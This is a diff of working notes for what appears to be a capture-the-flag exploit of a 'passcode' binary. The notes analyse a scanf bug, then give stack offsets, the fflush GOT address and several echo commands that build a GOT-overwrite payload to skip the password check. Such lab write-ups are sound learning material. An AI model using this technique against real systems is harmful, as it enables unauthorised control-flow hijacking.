@@ -1,0 +1,44 @@
+issue: login() uses scanf("%d", int) -- not scanf("%d", &int)
+int passcode1, passcode2 are on the stack in local login() space
+previous call to welcome() puts a 100char buffer on the stack that we can write into
+so we can figure out where we have to write into that 100char buffer s.t. they end up in passcode1, passcode2 at time of call to login()
+except...
+passcode2 location lines up with the stack canary
+so we need something more clever
+we can put any address in our payload, and write any 4 bytes to that address with the passcode1: prompt
+so, let's write the address of the fflush() entry in the GOT, and overwrite its value with address 0x08049292... skipping the passcode2 prompt and the check, going straight to success
+readelf --relocs ./passcode gives the address of the fflush() entry in the GOT at 0x0804c014
+
+
+
+
+buf @ ebp-0x70
+pw1 @ ebp-0x10  | 123456    =   0x 00 01 e2 40 -> store as 0x 40 e2 01 00
+pw2 @ ebp-0xc   | 13371337  =   0x 00 cc 07 c9 -> store as 0x c9 07 cc 00
+
+0x08049334 -- right after welcome() scanf
+0x0804922d -- right after login() scanf 1
+0x08049268 -- right after login() scanf 2
+
+65: A
+66: B
+
+(echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n" && cat) | ./passcode
+
+echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /tmp/p4yload
+
+naive: leak buf into passcode1. works, but no way to get passcode2 to line up
+echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\xe2\x01\x00" > /tmp/p4yload
+
+testing: demo overwrite of next instruction
+echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2d\x92\x04\x08 16843009" > /tmp/p4yload
+echo -n -e "16843009" > /tmp/p5yload
+
+GOT overwrite
+echo -n -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x14\xc0\x04\x08 134517394" > /tmp/p4yload
+echo -n -e "\x01\x01\x01\x01" > /tmp/p5yload
+
+
+run < <(cat /tmp/p4yload ; cat /tmp/p5yload)
+
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
